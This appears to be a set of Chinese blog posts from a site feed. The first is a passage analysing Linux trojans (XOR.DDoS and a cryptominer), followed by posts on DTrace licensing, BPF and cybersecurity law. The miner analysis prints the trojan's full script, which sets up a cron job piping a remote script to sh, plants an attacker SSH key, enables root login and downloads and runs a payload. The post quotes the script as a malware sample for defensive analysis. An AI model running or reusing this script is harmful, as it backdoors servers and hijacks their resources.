<p>杀毒软件公司Avast在它们的博客中解释了这种新的威胁，该木马可以根据目标Linux系统环境的不同来相应调整安装方式，并安装一个rootkit来躲避杀毒软件的检测。黑客首先通过SSH暴力登录目标Linux系统，然后尝试获得根用户证书。如果成功，则通过一个shell脚本安装该木马，该shell脚本的功能主要包括：主程序、环境检测、编译、解压、安装等。该木马首先通过受害系统的内核头文件来进行兼容性检测，如果成功匹配则继续安装一个rootkit，以此来隐藏木马自身。</p>
<p>此外，它主要针对游戏和教育网站，能够对其发起强有力的DDoS攻击，可以达到每秒1500亿字节的恶意流量。根据内容分发网络Akamai科技发布的一份报告，XOR DDoS僵尸网络每天至少瞄准20个网站，将近90%的目标站点位于亚洲。报告中声称：<br>“Akamai的安全情报反应小组（SIRT）正在追踪XOR DDoS，这是一个木马恶意软件，攻击者使用它劫持Linux机器并将其加入到僵尸网络，以发起分布式拒绝服务攻击（DDoS）活动。迄今为止，XOR DDoS僵尸网络的DDoS攻击带宽从数十亿字节每秒（Gbps）到150+Gbps。游戏行业是其主要的攻击目标，然后是教育机构。今天早上Akamai SIRT发布了一份安全威胁报告，该报告由安全响应工程师Tsvetelin ‘Vincent’ Choranov所作。”</p>
<h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p><strong>多态（Polymorphic）</strong> 是指恶意软件在自我繁殖期间不断改变（“morphs”）其自身文件特征码（大小、hash等等）的特点，衍生后的恶意软件可能跟以前副本不一致。因此，这种能够自我变种的恶意软件很难使用基于签名扫描的安全软件进行识别和检测。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/trojan-demo-1.png" alt="样本"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/trojan-demo-1-2.png" alt="样本"></p>
<p>木马具有非常多功能：增加服务、删除服务、执行程序、隐藏进程、隐藏文件、下载文件、获取系统信息、发起DDOS攻击等行为。<br>主程序的作用是根据感染目标机器的系统开发版本传输并且选择C&amp;C服务器。<br>C2服务器归属地为美国,加利福尼亚州,洛杉矶。</p>
<p>其实就算是拿到了样本，逆向难度也很大。何况木马关键数据全部加密，传输过程也加密，哪哪都是加密。笔者曾经试图自行破解，找来了《IDA Pro指南》之类的秘籍，无奈功力不够，只能草草收场。</p>
<h4 id="防御之难"><a href="#防御之难" class="headerlink" title="防御之难"></a>防御之难</h4><p>首先，防御一方是守城战。资源有限，防线漫长，安全投入大见效慢。做与不做效果无法评估，做了不代表没有漏洞，不做也不见得出什么大事。</p>
<p>其次，消极安全观主导制度体系建设。每个大单位都有安全责任制，甚至很多地方都上升到安全KPI一票否决的高度。实际情况呢？ 管理上的松散、各自为战，为了安全KPI，消极看待业务需求，逼得业务方剑走偏锋，反而增加了漏洞风险。</p>
<p>最后，攻防双方技术上完全不对等。<br>攻击者已经进化到大兵团作战模式，兵强马壮，甚至还发展出CaaS（Crime as a Service）这类梦幻般的服务理念。例如僵尸网络不仅可以调度全部资源，提供大规模攻击服务，还能提供间歇性的慢速攻击服务。按需收费，童叟无欺。<br>防御者基本上还是的大刀长矛。这战没发打。</p>
<h4 id="合作"><a href="#合作" class="headerlink" title="合作"></a>合作</h4><p>如果凭借笔者个人的天资和努力，甚至凭借本公司的力量，几乎可以肯定，我们到现在还不一定能知道这款的木马的名字，更不用说管窥它的细节。因为我们根本就不是安全公司，几百号人里面连一个安全专家都没有。这种情况在其它企业应该也具有普遍性。</p>
<p>在这次的案例中，很快就完成了从样本捕获、攻击分析到安全加固的一系列动作，全程业务不受太大影响，甲方用户基本无感知。关键得益于和第三方的充分合作。</p>
<p>微步在线（ThreatBook）——国内首家威胁情报公司。它们的思路很特别，没有去走传统安全公司的老路，而是专注于威胁情报的样本分析、收集和处理，实现大范围长跨度的数据积累，促进情报交流和信息共享，通过合作创造价值。这个思路对于打破行业、竞争企业的壁垒，意义非凡。</p>
<p>最近，它们刚刚拿到A轮投资，资本市场就是敏锐。</p>
<h2 id="今天你被挖矿了吗？"><a href="#今天你被挖矿了吗？" class="headerlink" title="今天你被挖矿了吗？"></a>今天你被挖矿了吗？</h2><p>书接上文，针对编号101样本的分析，我们已经知道，黑色产业界通过植入木马，控制了大量主机资源，只要有人花钱，就可以按需要调度足够的资源发动DDos攻击，据说还可以按效果付费。此外，还有一种常见模式则是“挖矿木马”，首先还是来看样本：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root      3744 29921  0 19:53 pts/0    00:00:00 grep min</span><br><span class="line">root     31333     1 99 19:48 ?        02:46:38</span><br><span class="line">/opt/minerd -B -a cryptonight</span><br><span class="line">-o stratum+tcp://xmr.crypto-pool.fr:8080 -u</span><br><span class="line">48vKMSzWMF8TCVvMJ6jV1BfKZJFwNXRntazXquc7fvq9DW23GKk</span><br><span class="line">cvQMinrKeQ1vuxD4RTmiYmCwY4inWmvCXWbcJHL3JDwp -p x</span><br></pre></td></tr></table></figure></p>
<p>uptime看到的负载值非常高。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 启动脚本</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;*/15 * * * * curl -fsSL https://r.chanstring.com/pm.sh?0706 | sh&quot;</span> &gt; /var/spool/cron/root</span><br><span class="line">mkdir -p /var/spool/cron/crontabs</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;*/15 * * * * curl -fsSL https://r.chanstring.com/pm.sh?0706 | sh&quot;</span> &gt; /var/spool/cron/crontabs/root</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">&quot;/root/.ssh/KHK75NEOiq&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    mkdir -p ~/.ssh</span><br><span class="line">    rm -f ~/.ssh/authorized_keys*</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzwg/9uDOWKwwr1zHxb3mtN++94RNITshREwOc9hZfS/F/yW8KgHYTKvIAk/Ag1xBkBCbdHXWb/TdRzmzf6P+d+OhV4u9nyOYpLJ53mzb1JpQVj+wZ7yEOWW/QPJEoXLKn40y5hflu/XRe4dybhQV8q/z/sDCVHT5FIFN+tKez3txL6NQHTz405PD3GLWFsJ1A/Kv9RojF6wL4l3WCRDXu+dm8gSpjTuuXXU74iSeYjc4b0H1BWdQbBXmVqZlXzzr6K9AZpOM+ULHzdzqrA3SX1y993qHNytbEgN+9IZCWlHOnlEPxBro4mXQkTVdQkWo0L4aR7xBlAdY7vRnrvFav root&quot;</span> &gt; ~/.ssh/KHK75NEOiq</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;PermitRootLogin yes&quot;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;RSAAuthentication yes&quot;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;PubkeyAuthentication yes&quot;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;AuthorizedKeysFile .ssh/KHK75NEOiq&quot;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line">    /etc/init.d/sshd restart</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">&quot;/etc/init.d/lady&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> [ ! -f <span class="string">&quot;/etc/systemd/system/lady.service&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        mkdir -p /opt</span><br><span class="line">        curl -fsSL https://r.chanstring.com/v12/lady_`uname -i` -o /opt/KHK75NEOiq33 &amp;&amp; chmod +x /opt/KHK75NEOiq33 &amp;&amp; /opt/KHK75NEOiq33</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">service lady start</span><br><span class="line">systemctl start lady.service</span><br><span class="line">/etc/init.d/lady start</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;*/15 * * * * curl -fsSL https://r.chanstring.com/pm.sh?0706 | sh&quot;</span> &gt; /var/spool/cron/root</span><br><span class="line">mkdir -p /var/spool/cron/crontabs</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;*/15 * * * * curl -fsSL https://r.chanstring.com/pm.sh?0706 | sh&quot;</span> &gt; /var/spool/cron/crontabs/root</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">&quot;/root/.ssh/KHK75NEOiq&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    mkdir -p ~/.ssh</span><br><span class="line">    rm -f ~/.ssh/authorized_keys*</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzwg/9uDOWKwwr1zHxb3mtN++94RNITshREwOc9hZfS/F/yW8KgHYTKvIAk/Ag1xBkBCbdHXWb/TdRzmzf6P+d+OhV4u9nyOYpLJ53mzb1JpQVj+wZ7yEOWW/QPJEoXLKn40y5hflu/XRe4dybhQV8q/z/sDCVHT5FIFN+tKez3txL6NQHTz405PD3GLWFsJ1A/Kv9RojF6wL4l3WCRDXu+dm8gSpjTuuXXU74iSeYjc4b0H1BWdQbBXmVqZlXzzr6K9AZpOM+ULHzdzqrA3SX1y993qHNytbEgN+9IZCWlHOnlEPxBro4mXQkTVdQkWo0L4aR7xBlAdY7vRnrvFav root&quot;</span> &gt; ~/.ssh/KHK75NEOiq</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;PermitRootLogin yes&quot;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;RSAAuthentication yes&quot;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;PubkeyAuthentication yes&quot;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;AuthorizedKeysFile .ssh/KHK75NEOiq&quot;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line">    /etc/init.d/sshd restart</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">&quot;/etc/init.d/lady&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> [ ! -f <span class="string">&quot;/etc/systemd/system/lady.service&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        mkdir -p /opt</span><br><span class="line">        curl -fsSL https://r.chanstring.com/v12/lady_`uname -i` -o /opt/KHK75NEOiq33 &amp;&amp; chmod +x /opt/KHK75NEOiq33 &amp;&amp; /opt/KHK75NEOiq33</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">service lady start</span><br><span class="line">systemctl start lady.service</span><br><span class="line">/etc/init.d/lady start</span><br><span class="line"></span><br><span class="line">mkdir -p /opt</span><br><span class="line"></span><br><span class="line"><span class="comment"># /etc/init.d/lady stop</span></span><br><span class="line"><span class="comment"># systemctl stop lady.service</span></span><br><span class="line"><span class="comment"># pkill /opt/cron</span></span><br><span class="line"><span class="comment"># pkill /usr/bin/cron</span></span><br><span class="line"><span class="comment"># rm -rf /etc/init.d/lady</span></span><br><span class="line"><span class="comment"># rm -rf /etc/systemd/system/lady.service</span></span><br><span class="line"><span class="comment"># rm -rf /opt/KHK75NEOiq33</span></span><br><span class="line"><span class="comment"># rm -rf /usr/bin/cron</span></span><br><span class="line"><span class="comment"># rm -rf /usr/bin/.cron.old</span></span><br><span class="line"><span class="comment"># rm -rf /usr/bin/.cron.new</span></span><br></pre></td></tr></table></figure>
<p><strong>商业模式</strong><br>被植入比特币“挖矿木马”的电脑，系统性能会受到较大影响，电脑操作会明显卡慢、散热风扇狂转；另一个危害在于，“挖矿木马”会大量耗电，并造成显卡、ＣＰＵ等硬件急剧损耗。比特币具有匿名属性，其交易过程是不可逆的，被盗后根本无法查询是被谁盗取，流向哪里，因此也成为黑客的重点窃取对象。</p>
<p><strong>攻击&amp;防御</strong><br>植入方式：安全防护策略薄弱，利用Jenkins、Redis等中间件的漏洞发起攻击，获得root权限。</p>
<p>最好的防御可能还是做好防护策略、严密监控服务器资源消耗（CPU／load）。</p>
<p>这种木马很容易变种，很多情况杀毒软件未必能够识别：<br>63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1037849-a1acdb7f1a4b062c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p><img src="http://upload-images.jianshu.io/upload_images/1037849-6b11b0ad9034756f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<h2 id="扩展阅读：《The-Cyber-Security-Master》"><a href="#扩展阅读：《The-Cyber-Security-Master》" class="headerlink" title="扩展阅读：《The Cyber-Security Master》"></a>扩展阅读：<a href="https://www.gitbook.com/book/riboseyim/cyber-security-manual">《The Cyber-Security Master》</a></h2><ul>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Cyber-Security: Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/10/29/CyberSecurity-WiFi/">Cyber-Security: 警惕 Wi-Fi 漏洞</a></li>
<li><a href="https://riboseyim.github.io/2017/08/31/CyberSecurity-Headers/">Cyber-Security: Web应用安全：攻击、防护和检测</a></li>
<li><a href="https://riboseyim.github.io/2017/08/09/Protocol-IPv6/">Cyber-Security: IPv6 &amp; Security</a></li>
<li><a href="https://riboseyim.github.io/2016/10/06/CyberSecurity-SSH/">Cyber-Security: OpenSSH 并不安全</a></li>
<li><a href="https://riboseyim.github.io/2016/06/12/CyberSecurity-Trojan/">Cyber-Security: Linux/XOR.DDoS 木马样本分析</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">Packet Capturing:关于网络数据包的捕获、过滤和分析</a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/Network-Ntopng/">新一代Ntopng网络流量监控—可视化和架构分析</a></li>
<li><a href="http://www.jianshu.com/p/670c4d2bb419">Cyber-Security: 事与愿违的后门程序 | Economist</a></li>
<li><a href="https://riboseyim.github.io/2016/10/07/CyberSecurity/">Cyber-Security: 美国网络安全立法策略</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/">Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://www.freebuf.com/articles/system/101447.html">黑暗幽灵（DCM）木马详细分析</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI5NjA0NjI5MQ==&amp;mid=402079537&amp;idx=1&amp;sn=b93de2473aea9277d8fd2322d474f2b8&amp;scene=1&amp;srcid=0118n7qI0bA7nbgyvKtPR8cE%23rd">深入剖析某国外组织针对中国境内企业的APT攻击(CVE-2015-8651) | 2016-01-18 微步在线 安全威胁情报</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651061988&amp;idx=1&amp;sn=cecdc131836a173e10011b250cdd6404&amp;chksm=bd186c6f8a6fe57993839f39255d3ccbabfc92147e6cbd01e6a00de612ec5ff9bd39c555d3b1&amp;scene=1&amp;srcid=0923kSI3JsGlwEmQJT6us9I6%23rd">隐秘通讯与跳板？C&amp;C服务器究竟是怎么一回事 | 2016-09-23 ArthurKiller FreeBuf</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651062028&amp;idx=4&amp;sn=cee860f17a46dee5887241c147c78467&amp;chksm=bd186d878a6fe4919f5653ce4768aec591c97df0c2aaccf8f052515046f12462775d7a1bfee5&amp;mpshare=1&amp;scene=1&amp;srcid=0928m4qXiM7SDmcrazip1g7V%23rd">逆向工厂（二）：静态分析技术 | 2016-09-28 追影人 FreeBuf</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>Cyber-Security</tag>
        <tag>网络协议</tag>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title>动态追踪技术(五)：DTrace for Linux</title>
    <url>/2018/02/16/DTrace-Linux/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>里程碑：DTrace 从 CDDL 切换为 GPL 许可证</li>
<li>里程碑：Linux 合并 BPF</li>
</ul>
<span id="more"></span>
<h2 id="里程碑：DTrace-切换到-GPL-许可证"><a href="#里程碑：DTrace-切换到-GPL-许可证" class="headerlink" title="里程碑：DTrace 切换到 GPL 许可证"></a>里程碑：DTrace 切换到 GPL 许可证</h2><h4 id="News-dtrace-dropped-the-CDDL-and-switched-to-the-GPL"><a href="#News-dtrace-dropped-the-CDDL-and-switched-to-the-GPL" class="headerlink" title="News:dtrace dropped the CDDL and switched to the GPL!"></a>News:dtrace dropped the CDDL and switched to the GPL!</h4><p>根据 2月14日 Brendan Gregg 在 Twitter 上推送的消息：Oracle 已经将 DTrace 模块的开源许可证从 CDDL 切换到 GPL，预计最快到 2018 年底 Linux kernel 就可以发布一个可用的 /usr/sbin/dtrace ，底层基于 bcc 和 eBPF 。</p>
<blockquote>
<p>Good news from Oracle: DTrace is GPL’d (thank you!). I’d guess by the end of 2018 we’ll have a working /usr/sbin/dtrace on Linux for running D scripts (using libbcc+eBPF on the backend)</p>
</blockquote>
<p>关于动态追踪技术（Dynamic Tracing），我们在之前的文章已经有所介绍，<a href="https://riboseyim.github.io/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a> 。DTrace 是动态追踪技术的鼻祖，源自 Solaris 操作系统，提供了高级性能分析和调试功能（ advanced performance analysis and troubleshooting tool ）。</p>
<p>Oracle 收购 SUN 公司之后推出了 Oracle Linux DTrace （基于 Oracle 企业级内核  Unbreakable Enterprise Kernel ，UEK)，针对性地发展完善了一系列探针如 syscall, profile, sdt, proc, sched 和 USDT，受制于诸多原因一直没有进入 Linux kernel 代码树，其中最大的一个障碍是许可授权问题：DTrace 源代码采用 CDDL 许可证，不兼容 Linux kernel 使用的 GPLv2 许可证，无法直接移植。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">commit e1744f50ee9bc1978d41db7cc93bcf30687853e6</span><br><span class="line">Author: Tomas Jedlicka &lt;tomas.jedlicka@oracle.com&gt;</span><br><span class="line">Date: Tue Aug <span class="number">1</span> <span class="number">09</span>:<span class="number">15</span>:<span class="number">44</span> <span class="number">2017</span> <span class="number">-0400</span></span><br><span class="line"></span><br><span class="line">dtrace: Integrate DTrace Modules into kernel proper</span><br><span class="line"></span><br><span class="line">This changeset integrates DTrace <span class="keyword">module</span> sources into the main kernel</span><br><span class="line">source tree under the GPLv2 license. Sources have been moved to</span><br><span class="line">appropriate locations in the kernel tree.</span><br></pre></td></tr></table></figure>
<h4 id="CDDL-vs-GPL"><a href="#CDDL-vs-GPL" class="headerlink" title="CDDL vs GPL"></a>CDDL vs GPL</h4><p>DTrace 与 OpenSolaris 一样之前是基于 CDDL 许可证而不是 Linux kernel 使用的 GPL 许可证，二者的区别是什么呢？</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Software-license-classification.png" alt=""></p>
<p>GNU通用公共许可协议（GNU General Public License，简称 GNU GPL、GPL，港台地区翻译为“GNU通用公共授权条款”）是广泛使用的免费软件许可证，最初由GNU项目的自由软件基金会（FSF）的理查德·斯托曼（Richard Matthew Stallman）撰写。 </p>
<p>一般的版权概念（“copyright”），从不授予用户任何权利（除了使用的权利），更多的是限制性规定，例如复制、修改、分发等，也可以包括一些法律允许的行为，比如逆向工程。GPL 则代表了知识产权制度的左翼阵营（“copyleft”），它授予被许可人以下权利（或称“自由”）：</p>
<ul>
<li>以任何目的运行此程序的自由；</li>
<li>再复制的自由；</li>
<li>修改程序并公开发布改进版的自由（前提是能得到源代码）。</li>
</ul>
<p>GPL 及其它 Copyleft 协议授予了被许可人（几乎是任何人）以非常广泛的自由，同时利用版权法设计了“传染机制”：GPL明确规定，任何源码的衍生产品，如果对外发布，都必须保持同样的许可证。这就是说，任何人只要发布基于某个GPL软件的修改版本，他就必须公开源码，并且同意他人可以自由地复制和分发，否则原始作者可以根据版权法起诉 。</p>
<p>DTrace 的 CDDL 许可证继承自 Sun Microsystems 。通用开发与发行许可证（Common Development and Distribution License，简称CDDL） 是一个由 Sun 提出的授权协议，它以 Mozilla 公共许可证（MPL）1.1版本为基础。基于 CDDL 许可证的项目主要有：OpenSolaris (含 DTrace 和 ZFS) 、NetBeans IDE 、GlassFish 等。</p>
<blockquote>
<p>Like the MPL, the CDDL is a weak copyleft license in-between GPL license and BSD/MIT permissive licenses, requiring only source code files under CDDL to remain under CDDL.</p>
</blockquote>
<p>鉴于 GPL 许可模式下很难通过开源软件直接盈利，因此也有很多类似 CDDL 的开源协议倾向于支持商业开发，授予厂商更大的决定权。CDDL 最大的特点是源代码和可执行文件允许采用不同的许可证。例如一般不存在 GPL 模式下存在的 “社区”版本，而是由厂商提供一些免费版本供开发者在非生产环境下使用，同时附上 CDDL 许可的源代码，开发者可以自行编译和部署；更重要的是，厂商只对付费客户提供安全补丁修复和维护版本的源代码。</p>
<p><strong>综上所述</strong>，基于 CDDL 许可证的 DTrace 你只可以使用但不允许围绕代码进行修改，或者添加其他跟踪点。Paul Fox 个人贡献的dtrace4linux 项目就试图移植 Sun DTrace 到 Linux 的 ，但是受限于许可证只能做到附加产品（add-on）, 外部人员很难直接参与进来，事实上 CDDL 许可证的项目外部贡献最多一般不会超过 10% 。</p>
<h4 id="Future"><a href="#Future" class="headerlink" title="Future"></a>Future</h4><p>在此之前，Linux 已经拥有 SystemTap 和动态探针（dprobes），DTrace 是基于整个系统的全局跟踪、调试、分析工具。Linux kernel 的创建者显然不喜欢一个“复杂”的系统（large system）, 他们倾向于将跟踪、分析和探测划分为彼此独立的小单元。许多开发者为此发明了各种钩子（hooks）以及整合某些特定探针（probes）的便利工具，例如 kprobes , uprobes, markers 等。 dtrace for linux 正式进入 Linux kernel 之后，有望将相关技术整合成一个更强大的体系，这一点非常令人期待。</p>
<h2 id="里程碑：Linux-合并-BPF"><a href="#里程碑：Linux-合并-BPF" class="headerlink" title="里程碑：Linux 合并 BPF"></a>里程碑：Linux 合并 BPF</h2><p>2016年11月，Linux 4.9-rc1发布，正式合并了一项重要特性：BPF追踪（Timed sampling）。</p>
<p>系统性能领域的国际导师Brendan Gregg，感动得都快哭了，当即在Twitter上表示这是一个重要的里程碑!<br>他随后又写了一篇长文<a href="http://www.brendangregg.com/blog/2016-10-27/dtrace-for-linux-2016.html">《DTrace for Linux 2016》</a>，以示庆祝。</p>
<blockquote>
<p>As a long time DTrace user and expert, this is an exciting milestone!<br>—Brendan Gregg</p>
</blockquote>
<p>Linux 合并了BPF而已嘛，跟DTrace这个劳什子有什么关系呢？</p>
<p>DTrace 是动态追踪技术的鼻祖，源自 Solaris 操作系统，提供了高级性能分析和调试功能，它的源代码采用 CDDL 许可证，不兼容 Linux 内核使用的 GPLv2 许可证，无法直接移植。当然，江湖上还有另外一种说法，Linux之所以一直没有原生支持DTrace,是因为Linus 觉得这玩意没什么必要。Anyway,随着 BPF跟踪的最后主要功能合并到 Linux 4.9-rc1，Linux 现在有了类似 DTrace 的高级分析和调试功能。</p>
<p>Linux 这次合并的BPF（The Berkeley Packet Filter ），来自于加州大学伯克利分校（这所大学很有意思，以后还要反复提到）。BPF，顾名思义，最早只是一个纯粹的封包过滤器，后来在很多牛人的参与下，进行了扩展，得到了一个所谓的 eBPF，可以作为某种更加通用的内核虚拟机。通过这种机制，我们其实可以在 Linux 中构建类似 DTrace 那种常驻内核的动态追踪虚拟机。</p>
<blockquote>
<p>Linux 没有 DTrace（名字），但现在有了 DTrace（功能）</p>
</blockquote>
<h2 id="扩展阅读：动态追踪技术"><a href="#扩展阅读：动态追踪技术" class="headerlink" title="扩展阅读：动态追踪技术"></a>扩展阅读：动态追踪技术</h2><ul>
<li><a href="https://riboseyim.github.io/2017/05/29/Linux-Works/">操作系统原理 | How Linux Works（一）：How the Linux Kernel Boots</a></li>
<li><a href="https://riboseyim.github.io/2017/05/29/Linux-Works/">操作系统原理 | How Linux Works（二）：User Space &amp; RAM</a></li>
<li><a href="https://riboseyim.github.io/2017/12/11/Linux-Works-Memory/">操作系统原理 | How Linux Works（三）：Memory</a></li>
<li><a href="https://riboseyim.github.io/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.github.io/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://gnu.wildebeest.org/blog/mjw/2018/02/14/dtrace-for-linux-oracle-does-the-right-thing/">DTRACE FOR LINUX; ORACLE DOES THE RIGHT THING | February 14, 2018 | MARK J. WIELAARD</a></li>
<li><a href="http://www.oracle.com/technetwork/server-storage/linux/downloads/linux-dtrace-2800968.html">Oracle Linux DTrace</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>Economist</tag>
        <tag>Policy&amp;Law</tag>
        <tag>DTrace</tag>
      </tags>
  </entry>
  <entry>
    <title>DTrace-SystemTap</title>
    <url>/2018/11/30/DTrace-SystemTap/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h1 id="SystemTap"><a href="#SystemTap" class="headerlink" title="SystemTap"></a>SystemTap</h1><h2 id="4-4-1-探针"><a href="#4-4-1-探针" class="headerlink" title="4.4.1 探针"></a>4.4.1 探针</h2><h2 id="4-4-2-tapset"><a href="#4-4-2-tapset" class="headerlink" title="4.4.2 tapset"></a>4.4.2 tapset</h2><h2 id="4-4-3-action和内置变量"><a href="#4-4-3-action和内置变量" class="headerlink" title="4.4.3 action和内置变量"></a>4.4.3 action和内置变量</h2><h2 id="4-4-4-示例"><a href="#4-4-4-示例" class="headerlink" title="4.4.4 示例"></a>4.4.4 示例</h2><h2 id="4-4-5-开销"><a href="#4-4-5-开销" class="headerlink" title="4.4.5 开销"></a>4.4.5 开销</h2><h2 id="4-4-6-文档和资源"><a href="#4-4-6-文档和资源" class="headerlink" title="4.4.6 文档和资源"></a>4.4.6 文档和资源</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DTrace</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全专题 | Overview of Cyber-Security</title>
    <url>/2016/10/07/CyberSecurity/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>The Big Picture</li>
<li>法律视角</li>
<li>组织视角</li>
<li>经济视角</li>
<li>技术视角</li>
</ul>
<span id="more"></span>
<blockquote>
<p>一些最英明的审计师说，只有三种内部控制目标：确保财务报告的可靠性，符合法律法规，以及运营的效率和效果。——《凤凰项目 一个IT运维的传奇故事》第 241 页</p>
</blockquote>
<h2 id="The-Big-Picture"><a href="#The-Big-Picture" class="headerlink" title="The Big Picture"></a>The Big Picture</h2><h2 id="法律视角"><a href="#法律视角" class="headerlink" title="法律视角"></a>法律视角</h2><blockquote>
<p>The Red Army had been gone for years, but it still had the power to inspire controversy—and destruction……the same sorts of challenges the modern administrative state faces in fields like environmental law, antitrust law, products liability law, and public health law. —《Regulating Cybersecurity》 (forthcoming 2013)。</p>
</blockquote>
<h4 id="美国网络安全立法策略"><a href="#美国网络安全立法策略" class="headerlink" title="美国网络安全立法策略"></a>美国网络安全立法策略</h4><p>学术界普遍认为国家的关键基础设施，如银行，电信网络，电网等等，非常容易受到灾难性的网络攻击。然而，现有的学术文献并未充分阐述这一问题，因其将网络安全的范畴过度狭隘化。作者认为，与其仅仅将这些私有企业视为网络犯罪的潜在受害者或是网络冲突的潜在目标，我们更应从行政法的范畴来看待他们。在诸如环境法，反垄断法，产品责任法，公共卫生法等领域也面临相似的挑战。这些法律范畴不仅产出一个思考网络安全的更丰富的分析框架，也提出了可能的应对策略。</p>
<ol>
<li>Environmental Law  环保法</li>
<li>Antitrust Law  反托拉斯法 反垄断法</li>
<li>Products liability Law  产品责任法</li>
<li>Public Health Law 公共卫生法</li>
</ol>
<p><img src="http://riboseyim-qiniu.riboseyim.com/theme_law_cybersecurity.png" alt=""></p>
